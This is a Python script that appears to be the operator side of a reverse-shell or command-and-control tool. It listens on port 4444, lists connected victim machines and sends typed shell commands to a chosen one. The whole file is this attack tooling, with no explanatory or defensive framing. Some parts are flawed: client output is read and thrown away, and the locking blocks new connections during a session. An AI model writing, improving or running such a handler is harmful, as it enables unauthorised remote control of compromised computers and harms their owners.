import socket
import threading

clients = {}
client_id_counter = 1
lock = threading.Lock()

def handle_client(client_id, client_socket, client_address):
    print(f"[+] Client {client_id} connected from {client_address}")
    while True:
        try:
            data = client_socket.recv(1024)
            if not data:
                break
        except:
            break
    with lock:
        del clients[client_id]
    client_socket.close()
    print(f"[-] Client {client_id} disconnected")

def client_command_loop(client_id):
    client_socket = clients[client_id]['socket']
    while True:
        cmd = input(f"Shell (Client {client_id})> ")
        if cmd.lower() in ["exit", "back"]:
            break
        try:
            client_socket.send(cmd.encode())
        except:
            print(f"[!] Failed to send to client {client_id}")
            break

def server_menu():
    while True:
        print("\n=== Connected Clients ===")
        with lock:
            for cid in clients:
                print(f"[{cid}] {clients[cid]['addr']}")
        print("[0] Refresh / [exit] Quit")

        choice = input("Select client ID to interact with: ").strip()
        if choice.lower() == "exit":
            break
        elif choice == "0":
            continue
        elif choice.isdigit():
            cid = int(choice)
            with lock:
                if cid in clients:
                    client_command_loop(cid)
                else:
                    print("[!] Invalid client ID.")
        else:
            print("[!] Invalid input.")

def accept_connections(server_socket):
    global client_id_counter
    while True:
        client_socket, client_address = server_socket.accept()
        with lock:
            client_id = client_id_counter
            clients[client_id] = {
                "socket": client_socket,
                "addr": client_address
            }
            client_id_counter += 1
        threading.Thread(target=handle_client, args=(client_id, client_socket, client_address), daemon=True).start()

def start_server(host='0.0.0.0', port=4444):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)
    print(f"[*] Listening on {host}:{port}")

    threading.Thread(target=accept_connections, args=(server,), daemon=True).start()
    server_menu()
    print("[*] Shutting down.")
    server.close()

if __name__ == "__main__":
    start_server()
